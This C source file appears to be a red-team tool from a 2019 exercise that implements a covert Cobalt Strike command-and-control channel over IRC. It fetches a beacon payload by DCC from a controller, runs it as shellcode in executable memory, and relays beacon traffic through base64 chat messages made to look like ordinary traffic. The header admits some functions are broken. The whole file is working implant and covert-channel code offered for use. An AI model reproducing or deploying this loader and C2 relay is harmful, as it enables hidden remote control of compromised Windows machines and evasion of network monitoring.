/**
 * TestClient.c
 * by Lt Daniel Fitzgerald
 * Red Flag 19-3 - July 2019
 *
 * Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
 * This was created as a fall back to get basic functionality in a short amount of developemnt time. It is not complete and has errors.
 * Instead of using cloakify to convert B64 messages to normal looking strings, it just sends the B64 message over IRC.
 *
 * Current limitations: Can only do small commands (<500 bytes). Large transfer is broken due to incorrectly breaking up and parsing the B64 messages.
 *
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include "b64.h"

#define MAX 1024
#define B64MAX 2048
#define SA struct sockaddr

// Struct to hold info on the IRC session
struct IRCinfo
{
	char NICK[50];
	char PASS[50];
	char USER[50];
	char REALNAME[50];
	char CHANNEL[50];
	char TGTNICK[50];
};


/**
 * Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread
 *
 * @param payload Pointer to a buffer containing a Cobalt Strike beacon payload to be alloc'd and run
 * @param len Length of the payload buffer
 * @note Windows Only Implementation
 */
void spawnBeacon(char* payload, DWORD len) {

	HANDLE threadHandle;
	DWORD threadId = 0;
	char* alloc = (char*)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(alloc, payload, len);

	threadHandle = CreateThread(NULL, (SIZE_T)NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &threadId);
}


/**
 * Receives data from our C2 controller directly, not through IRC (for DCC file transfer)
 *
 * @param sd A socket file descriptor
 * @param len A pointer to store the length of data received in
 * @note Windows Only Implementation
 * @return A buffer containing the data received
*/
char* recvD(SOCKET sd, DWORD* len) {
	char* buffer;
	DWORD bytesReceived = 0, totalLen = 0;

	*len = 0;

	recv(sd, (char*)len, 4, 0);
	buffer = (char*)malloc(*len);
	if (buffer == NULL)
		return NULL;

	while (totalLen < *len) {
		bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0);
		totalLen += bytesReceived;
	}
	return buffer;
}

/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to an array containing the IP address to connect to
 * @param port A pointer to an array containing the port to connect on
 * @note Windows Only Implementation
 * @return A socket handle for the connection
*/
SOCKET create_socket(char* ip, char* port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}

/**
 * Formats variable arguments into a buffer and sends them to the IRC server
 *
 * @param sockfd A socket file descriptor
 * @param text, ... Variable arguments to format and store into a buffer
 * @note Windows Only Implementation
 * @return number of bytes sent
 */
int sendargv(SOCKET sockfd, char* text, ...)
{
	static char sendbuff[MAX];
	memset(sendbuff, 0, sizeof(sendbuff));
	va_list ap;
	va_start(ap, text);
	vsprintf(sendbuff, text, ap);
	va_end(ap);

	return send(sockfd, sendbuff, strlen(sendbuff), 0);
}


/**
 * Sends data to our C2 controller (via IRC) received from our injected beacon
 * TODO: This function is likly broked. Test/Debug/Fix!
 *
 * @param sd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
 * @note Windows Only Implementation
*/
void sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
	char* buffer = (char*)malloc(len + 4);
	if (buffer == NULL)
		return;
	char* bufferfixed;
	DWORD bytesWritten = 0, totalLen = 0;

	*(DWORD*)buffer = len;
	memcpy(buffer + 4, data, len);

	// Base64 encode the data
	int b64len;
	char* encodedmsg = base64(buffer, len+4, &b64len);

	// Make sure it ends in == so the server knows the end
	// TODO: Remove this dependency by sending the size
	if (strstr(encodedmsg, "=="))
	{
		bufferfixed = (char*)malloc(b64len);
		if (bufferfixed == NULL)
		{
			printf("malloc error!");
			return;
		}
		memcpy(bufferfixed, encodedmsg, b64len);
	}
	else if (strstr(encodedmsg, "="))
	{
		b64len += 1;
		bufferfixed = (char*)malloc(b64len);
		if (bufferfixed == NULL)
		{
			printf("malloc error!");
			return;
		}
		memcpy(bufferfixed, encodedmsg, b64len);
		strcat(bufferfixed, "=");
	}
	else
	{
		b64len += 2;
		bufferfixed = (char*)malloc(b64len);
		if (bufferfixed == NULL)
		{
			printf("malloc error!");
			return;
		}
		memcpy(bufferfixed, encodedmsg, b64len);
		strcat(bufferfixed, "==");
	}
	// Break message up to send a max of 425 bytes of data per IRC message
	char* partial = (char*)malloc(425);
	int offset = 0;
	while (offset < b64len)
	{
		if (offset + 425 >= b64len)
		{
			strncpy(partial, bufferfixed + offset, b64len-offset);
			sendargv(sd, "PRIVMSG %s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
			break;
		}
		else
		{
			strncpy(partial, bufferfixed + offset, 425);
			sendargv(sd, "PRIVMSG %s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
			offset += 425;
		}
		
	}
	
	free(partial);
	free(buffer);
	free(bufferfixed);
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 * TODO: Test this function. It may be broken.
 *
 * @param sd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @param len Length of data to send
 * @note Windows Only Implementation
 * @return A pointer to an array containing the received data
*/
char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
	char* buffer;
	DWORD bytesReceived = 0, totalLen = 0;

	*len = 0;

	// IRC recv loop
	// TODO: Refactor this to make it it's own function
	char recvbuff[MAX];
	char msgbuff[4096];
	BOOL multipacketflag = FALSE;
	char privDmExitMsg[64];
	sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
	char privChanExitMsg[64];
	sprintf(privChanExitMsg, "PRIVMSG %s :exit", ircinfo.CHANNEL);
	char privChanPING[64];
	sprintf(privChanPING, "PRIVMSG %s :PING", ircinfo.CHANNEL);
	memset(msgbuff, 0, sizeof(msgbuff));
	for (;;)
	{
		memset(recvbuff, 0, sizeof(recvbuff));
		recv(sd, recvbuff, sizeof(recvbuff), 0);
		printf("From Server : %s", recvbuff);

		if (recvbuff[strlen(recvbuff) - 1] == '\n')
		{
			recvbuff[strlen(recvbuff) - 1] = '\0';
		}
		char* trafficptr = strstr(recvbuff, "TrafficGen-");
		if (trafficptr)
		{
			char* msg_end = "\0";
			// Iterate through every message in the IRC packet, there can be more than one
			while (trafficptr != 0 && strlen(trafficptr) > 2)
			{
				printf("Encoded message recv\n");
				// TrafficGen- is 11 char
				trafficptr += 11;
				// Find end of message (\r\n but the final \n of the packet has been changed to \0)
				msg_end = strstr(trafficptr, "\r");
				// Calculate length of message
				int msg_len = msg_end - trafficptr;
				// Increment msg_end to either end of message or to 1 character before next message
				msg_end += 1;
				// Null terminate it so we can use cloakptr as the message string
				if (trafficptr != NULL && trafficptr[msg_len] != '\0')
				{
					trafficptr[msg_len] = '\0';
				}
				if (msg_end == 0)
				{
					printf("Error: msg_end was 0\n");
					break;
				}
				else
				{
					// Copy msg into msgbuffer
					strcat(msgbuff, trafficptr);
					// If there are no more messages in this packet - break, else find the next cloakptr
					if (strlen(msg_end) < 2)
					{
						// printf("1 message packet\n");
						if (strstr(msg_end - 3, "=="))
						{
							multipacketflag = TRUE;
						}

						break;
					}
					else
					{
						printf("Multi message packet\n");
					}
					trafficptr = strstr(msg_end, "TrafficGen-");
				}
			}
		}
		if (multipacketflag)
		{
			break;
		}
		if (strstr(recvbuff, "PING :"))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, "PING :");
			pingsvr += strlen("PING :");
			sendargv(sd, "PONG :%s\n", pingsvr);
		}
		else if (strstr(recvbuff, privChanPING))
		{
			char* nullbyte = "\0";
			*len = 1;
			return nullbyte;
		}
		// Check if exit message in DM or channel
		else if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
		{
			sendargv(sd, "PRIVMSG %s :quitting\r\n", ircinfo.CHANNEL);
			sendargv(sd, "QUIT :\r\n");
		}
		// Check if ERROR message
		else if (strstr(recvbuff, "ERROR"))
		{
			printf("Server sent Error...\n");
			if (strstr(recvbuff, "Closing Link"))
			{
				printf("Error was to close link!\n");
			}
			break;
		}
		// Check if server is using DCC SEND to send a lot of data
		if (strstr(recvbuff, "PRIVMSG "))
		{
			char* dccptr = strstr(recvbuff, "DCC SEND ");
			if (dccptr)
			{
				printf("Got PRIVMSG DCC SEND\n");
				// Iterate to file position
				dccptr += 9;
				// Parse message to get filename, IP, port, and filesize
				char* fileptr = strtok(dccptr, " ");
				char* ipptr = strtok(NULL, " ");
				char* portptr = strtok(NULL, " ");
				char* filesizeptr = strtok(NULL, " ");
				// Connect to IP/port and read
				SOCKET dcc_sockfd = INVALID_SOCKET;
				// Convert IP from int to string
				printf("ipptr: %s\n", ipptr);
				char* ptr;
				ULONG ulIP = strtoul(ipptr, &ptr, 10);
				unsigned char bytes[4];
				bytes[0] = ulIP & 0xFF;
				bytes[1] = (ulIP >> 8) & 0xFF;
				bytes[2] = (ulIP >> 16) & 0xFF;
				bytes[3] = (ulIP >> 24) & 0xFF;
				char ip_buf[16];
				sprintf(ip_buf, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
				printf("DCC sender IP is %s\n", ip_buf);

				dcc_sockfd = create_socket(ip_buf, portptr);
				if (dcc_sockfd == INVALID_SOCKET)
				{
					printf("Socket creation error!\n");
					return NULL;
				}

				return recvD(dcc_sockfd, len);

			}
		}
	}
	// end of IRC recv loop

	printf("Encoded msg:%s\n", msgbuff);
	int unb64len;
	char* decodedmsg = unbase64(msgbuff, strlen(msgbuff) + 1, &unb64len);

	memcpy(len, decodedmsg, 4);
	printf("Msg len:%d\n", *len);
	buffer = (char*)malloc(*len);
	if (buffer == NULL)
		return NULL;
	memcpy(buffer, decodedmsg + 4, *len);
	return buffer;
}


/**
 * Connects to the name pipe spawned by the injected beacon
 *
 * @param pipeName Pointer to a buffer containing the name of the pipe to connect to
 * @note Windows Only Implementation
 * @return A handle to the beacon named pipe
 */
HANDLE connectBeaconPipe(const char* pipeName) {
	HANDLE beaconPipe;

	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);

	return beaconPipe;
}


/**
 * Receives data from our injected beacon via a named pipe
 *
 * @param pipe Handle to beacons SMB pipe
 * @param len Pointer to store the length of the data received in
 * @note Windows Only Implementation
 * @return Buffer containing the received data
 */
char* recvFromBeacon(HANDLE pipe, DWORD* len) {
	char* buffer;
	DWORD bytesRead = 0, totalLen = 0;

	*len = 0;

	ReadFile(pipe, len, 4, &bytesRead, NULL);
	buffer = (char*)malloc(*len);

	while (totalLen < *len) {
		ReadFile(pipe, buffer + totalLen, *len - totalLen, &bytesRead, NULL);
		totalLen += bytesRead;
	}
	return buffer;
}


/**
 * Write data to our injected beacon via a named pipe
 *
 * @param pipe Handle to beacons SMB pipe
 * @param data Pointer to buffer containing data to be written to pipe
 * @param len Length of data to be written to pipe
 * @note Windows Only Implementation
 */
void sendToBeacon(HANDLE pipe, const char* data, DWORD len) {
	DWORD bytesWritten = 0;
	WriteFile(pipe, &len, 4, &bytesWritten, NULL);
	WriteFile(pipe, data, len, &bytesWritten, NULL);
}


/**
 * Sets up initial connection to IRC server
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @note Windows Only Implementation
 */
void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "PASS %s\r\n", ircinfo.PASS);
	sendargv(sockfd, "NICK %s\r\n", ircinfo.NICK);
	sendargv(sockfd, "USER %s %s %s :%s\r\n", ircinfo.USER, "0", "*", ircinfo.REALNAME);

	char recvbuff[MAX];
	for (;;)
	{
		memset(recvbuff, 0, sizeof(recvbuff));
		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
		printf("From Server : %s", recvbuff);

		if (recvbuff[strlen(recvbuff) - 1] == '\n')
		{
			recvbuff[strlen(recvbuff) - 1] = '\0';
		}
		if (strstr(recvbuff, "MODE "))
		{
			printf("Connection done?\n");
			break;
		}
		if (strstr(recvbuff, "PING :"))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, "PING :");
			pingsvr += strlen("PING :");
			sendargv(sockfd, "PONG :%s\n", pingsvr);
		}
	}

	sendargv(sockfd, "USERHOST %s\r\n", ircinfo.USER);
	memset(recvbuff, 0, sizeof(recvbuff));
	recv(sockfd, recvbuff, sizeof(recvbuff), 0);
	printf("From Server : %s", recvbuff);
}

/**
 * Sends the command to join to a channel
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "JOIN %s\r\n", ircinfo.CHANNEL);
}


/**
 * Sends the command to become an operator on the IRC server
 * NOTE: This requires knowing the operator nick and password. This is only useful if you have edited the IRC server .conf file.
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "OPER %s %s\r\n", ircinfo.NICK, ircinfo.PASS);
}


/**
 * Sends the command to start c2
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void cloakstart(SOCKET sockfd, struct IRCinfo ircinfo)
{
	// TODO: Either find a better way to do this or change the string
	sendargv(sockfd, "PRIVMSG %s :cloak\r\n", ircinfo.CHANNEL);
}


/**
 * Read from IRC until a DCC send is received then connect and receive data
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @param len Pointer to store the length of the data received in
 * @note Windows Only Implementation
 * @return Buffer containing the received data
 */
char* wait_for_dcc(SOCKET sockfd, struct IRCinfo ircinfo, DWORD* len)
{
	// IRC recv loop
	char recvbuff[MAX];
	for (;;)
	{
		memset(recvbuff, 0, sizeof(recvbuff));
		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
		printf("From Server : %s", recvbuff);

		if (recvbuff[strlen(recvbuff) - 1] == '\n')
		{
			recvbuff[strlen(recvbuff) - 1] = '\0';
		}
		if (strstr(recvbuff, "DCC Send "))
		{
			printf("Got DCC Send\n");
		}
		if (strstr(recvbuff, "PRIVMSG "))
		{
			char* dccptr = strstr(recvbuff, "DCC SEND ");
			if (dccptr)
			{
				printf("Got PRIVMSG DCC SEND\n");
				// Iterate to file position
				dccptr += 9;
				// Parse message to get filename, IP, port, and filesize
				char* fileptr = strtok(dccptr, " ");
				char* ipptr = strtok(NULL, " ");
				char* portptr = strtok(NULL, " ");
				char* filesizeptr = strtok(NULL, " ");
				// Connect to IP/port and read
				SOCKET dcc_sockfd = INVALID_SOCKET;
				// Convert IP from int to string
				printf("ipptr: %s\n", ipptr);
				char* ptr;
				ULONG ulIP = strtoul(ipptr, &ptr, 10);
				unsigned char bytes[4];
				bytes[0] = ulIP & 0xFF;
				bytes[1] = (ulIP >> 8) & 0xFF;
				bytes[2] = (ulIP >> 16) & 0xFF;
				bytes[3] = (ulIP >> 24) & 0xFF;
				char ip_buf[16];
				sprintf(ip_buf, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
				printf("DCC sender IP is %s\n", ip_buf);

				dcc_sockfd = create_socket(ip_buf, portptr);
				if (dcc_sockfd == INVALID_SOCKET)
				{
					printf("Socket creation error!\n");
					return NULL;
				}

				return recvD(dcc_sockfd, len);

			}
		}
		if (strstr(recvbuff, "PING :"))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, "PING :");
			pingsvr += strlen("PING :");
			sendargv(sockfd, "PONG :%s\n", pingsvr);
		}
	}
}


/**
 * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 * @note Windows Only Implementation
 * @return 1 on failure
 */
int main(int argc, char* argv[])
{
	// Set connection and IRC info
	/*
	char* IP = "127.0.0.1";
	char* PORT = "6667";
	struct IRCinfo ircinfo;
	strcpy(ircinfo.NICK, "bot");
	strcpy(ircinfo.PASS, "bot");
	strcpy(ircinfo.USER, "covert");
	strcpy(ircinfo.REALNAME, "covertIRC");
	strcpy(ircinfo.CHANNEL, "#bot");
	strcpy(ircinfo.TGTNICK, "servbot");
	*/
	if (argc != 9)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK]");
		return 1;
	}
	char* IP = argv[1];
	char* PORT = argv[2];
	struct IRCinfo ircinfo;
	strcpy(ircinfo.NICK, argv[3]);
	strcpy(ircinfo.PASS, argv[4]);
	strcpy(ircinfo.USER, argv[5]);
	strcpy(ircinfo.REALNAME, argv[6]);
	strcpy(ircinfo.CHANNEL, argv[7]);
	strcpy(ircinfo.TGTNICK, argv[8]);

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	//SOCKET testsocket = createC2Socket("192.168.136.130", 8081);
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		return 1;
	}

	// Connect to IRC application
	ircconnect(sockfd, ircinfo);
	// Join a channel
	ircjoin(sockfd, ircinfo);
	// Send command to become operator
	becomeoper(sockfd, ircinfo);

	// Send command to tell server to connect to Team Server and send beacon payload
	Sleep(500);
	cloakstart(sockfd, ircinfo);

	payloadData = wait_for_dcc(sockfd, ircinfo, &payloadLen);
	if (payloadData == NULL)
	{
		printf("wait_for_dcc Error!\n");
		return 1;
	}
	else
	{
		printf("Received payload\n");
		// Start the CS beacon
		spawnBeacon(payloadData, payloadLen);

		// Loop until the pipe is up and ready to use
		while (beaconPipe == INVALID_HANDLE_VALUE) {
			// Create our IPC pipe for talking to the C2 beacon
			Sleep(500);
			printf("Trying to connect to pipe.\n");
			beaconPipe = connectBeaconPipe("\\\\.\\pipe\\mIRC");
		}
		printf("Connected to pipe!!\n");
	}

	while (1) {
		// Start the pipe dance
		payloadData = recvFromBeacon(beaconPipe, &payloadLen);
		if (payloadLen == 0) break;
		// TODO: Find a better way to do sleep timer if no data is ready or make it configurable
		if (payloadLen == 1) Sleep(2000);
		printf("Recv %d bytes from beacon\n", payloadLen);
		sendData(sockfd, ircinfo, payloadData, payloadLen);
		printf("Sent to TS\n");
		free(payloadData);

		payloadData = recvData(sockfd, ircinfo, &payloadLen);
		if (payloadLen == 0) break;
		printf("Recv %d bytes from TS\n", payloadLen);
		
		sendToBeacon(beaconPipe, payloadData, payloadLen);
		printf("Sent to beacon\n");
		free(payloadData);
	}


	return 0;
}

